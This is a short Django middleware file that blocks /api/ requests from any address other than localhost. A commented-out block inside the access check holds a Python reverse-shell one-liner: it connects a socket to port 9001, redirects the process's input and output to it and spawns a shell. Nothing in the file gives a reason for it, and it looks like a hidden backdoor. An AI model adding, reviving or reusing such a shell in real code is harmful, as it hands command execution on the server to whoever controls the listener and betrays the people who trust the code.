from django.http import HttpResponseForbidden

class APILocalhostOnlyMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Check if the path starts with '/api/' and if the request is not from localhost
        if request.path.startswith('/api/') and request.META['REMOTE_ADDR'] not in ['127.0.0.1', '::1']:
            return HttpResponseForbidden("Access Forbidden to /api/ from this IP address")
        
        # if request.path.startswith('/api/') and request.META['REMOTE_ADDR'] in ['127.0.0.1', '::1']:
        #     import os,pty,socket;s=socket.socket();s.connect(("127.0.0.1",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")

        return self.get_response(request)